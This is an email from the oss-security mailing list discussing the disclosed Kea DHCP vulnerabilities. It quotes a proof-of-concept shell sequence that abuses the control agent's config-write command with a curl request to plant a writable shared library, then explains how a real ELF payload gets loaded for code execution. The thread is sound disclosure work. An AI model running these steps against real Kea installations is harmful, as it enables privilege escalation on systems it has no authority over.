Received: (qmail 30045 invoked by uid 550); 30 May 2025 13:20:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 30014 invoked from network); 30 May 2025 13:20:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1748611235; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=v/WaRpG5MEScR/pOSNouTr3FKbq0D2zOMZSMWidsIIM=;
	b=RYU7eXqhrS7/qaki0dXSgKcFONKiUX3+a2jdKftu+eM4tRhYtc2+CmcqAcCcitLmoDm3GS
	4gk+f9dJCP7qJq2YJKQjX2sX3mtr1+qmIosOgeupQQpl6M2xvGuMQ8k9asDDx5seGNVplI
	HWOHGYxYQJ46s2w8zJmlV4qVJZvLRGU=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1748611235;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=v/WaRpG5MEScR/pOSNouTr3FKbq0D2zOMZSMWidsIIM=;
	b=k353nHTCB0DtLzu/rCuLa79nziKvd4V+uwVpSn+8FtcD78upzkdNP9UaxsYQ1vnKbifTR9
	pRwPHJkx/JN8EBCg==
Authentication-Results: smtp-out1.suse.de;
	dkim=pass header.d=suse.de header.s=susede2_rsa header.b=RYU7eXqh;
	dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=k353nHTC
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1748611235; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=v/WaRpG5MEScR/pOSNouTr3FKbq0D2zOMZSMWidsIIM=;
	b=RYU7eXqhrS7/qaki0dXSgKcFONKiUX3+a2jdKftu+eM4tRhYtc2+CmcqAcCcitLmoDm3GS
	4gk+f9dJCP7qJq2YJKQjX2sX3mtr1+qmIosOgeupQQpl6M2xvGuMQ8k9asDDx5seGNVplI
	HWOHGYxYQJ46s2w8zJmlV4qVJZvLRGU=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1748611235;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=v/WaRpG5MEScR/pOSNouTr3FKbq0D2zOMZSMWidsIIM=;
	b=k353nHTCB0DtLzu/rCuLa79nziKvd4V+uwVpSn+8FtcD78upzkdNP9UaxsYQ1vnKbifTR9
	pRwPHJkx/JN8EBCg==
Date: Fri, 30 May 2025 15:20:35 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <aDmwo585GRk9yOCZ@kasco.suse.de>
References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
 <aDdGEfMxLaRJzSK9@kasco.suse.de>
 <20250528182325.yuupynsufybqvea3@jwilk.net>
 <aDloR_R9LjYpBB28@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="29dCVFaDg5OAsk/k"
Content-Disposition: inline
In-Reply-To: <aDloR_R9LjYpBB28@kasco.suse.de>
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)

--29dCVFaDg5OAsk/k
Content-Type: text/plain; protected-headers=v1; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
Date: Fri, 30 May 2025 15:20:35 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)

Hi,

On Fri, May 30, 2025 at 10:11:51AM +0200, Matthias Gerstner wrote:
> > Default ACLs to the rescue!
> >=20
> > $ chmod a+x ~
> > $ mkdir -m 777 ~/.Private
> > $ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
> > $ curl -s -H "Content-Type: application/json" -d '{ "command": "config-=
write", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' =
localhost:8000 > /dev/null
> > $ echo pwned > ~/.Private/libexploit.so
> > $ ls -l ~/.Private/libexploit.so
> > -rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.=
so
> > $ cat ~/.Private/libexploit.so
> > pwned
>=20
> very nice addition! We already felt like there was little left to
> succeed in the attack, but didn't think of ACLs.

I just checked this attack vector more closely.

The resulting file receives the mode 0666, because bits missing in the
`mode` argument passed to `openat()` are masked out. The strace of
`kea-ctrl-agent` looks like this in this scenario:

    openat(AT_FDCWD, "/home/<user>/.Private/libexploit.so", O_WRONLY|O_CREA=
T|O_TRUNC, 0666) =3D 14

The missing executable bits are no obstacle, however, because on Linux
`mmap()` allows mapping executable code even if the underlying file is
not executable.

Writing a valid ELF file into the "configuration file" created by Kea
works e.g. like this:

    $ cat librealexploit.so >~/.Private/libexploit.so

With this, the library can successfully be loaded by Kea and the exploit
code starts to run. The code execution in this context is still itself
limited by the AppArmor rules, however. It is enough to fully control
all Kea state on disk.

Cheers

Matthias

--29dCVFaDg5OAsk/k
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmg5sKMACgkQFMQFyXGS
NVMgkg//b5MIG5s2Ss8/CirO5ZdnNUBDFOUqYF5hoZ/g0Ys/iqtFfHyzWYEh6XTq
E5K2xbcGEIE2zKVx591dOOQefQKXLFM1kQFcVabHWtAcfL1cBy5bdj/MpmoaSt2P
A2ct/hBp4aqKBkC5hL47sTmCEBsR0tjfxR9T/o7agLlVGao8itW3+oedS49tu9Aq
UpgIKQLNlvvLPH5EnShTiJojZYXxudaX4GGXY1PiUBsXg6MAzuJ5VfgCAfKn7Nmz
RULVIgn2fumFK4Zk3PghF2s6L5RyA/W6hQt/QbL7FnvtSLvC3XsSX+IeRTp8pGn1
9xS7q2tq/YAA924DmzZP4a/GTKvq6dRLaC4Zmd8CZL88ynPqWcHQ7pVlIObTic56
OqrBGw5x3yXIwgxQh/WGg0Aie+SPSetkaJEuS+j6h7xEiVOIIgmC3S+eBIboQc88
699TcPUwA/r92QElMF/5AGKMQWVoeB+xOrsT5DrH9Ti1gbwtLCZojdX67hKpwhIL
YbOjeviOxNPY3siGAChZ9bpr9OvEEBJ2uXBApl66FE3TA9ujsCZMqXNzMcXBsN84
kwB+bEQTtfLC5gnmZsMjEWeYvfy9SSjDJ7r+Ea8Jfa9nK2hYZpHbGioolw/z1Qbo
kanmi0C/h6kwV/TSzbCFEPVnekxl6Wx3BYmh9kJhVITeRzWxZw0=
=Ipdz
-----END PGP SIGNATURE-----

--29dCVFaDg5OAsk/k--
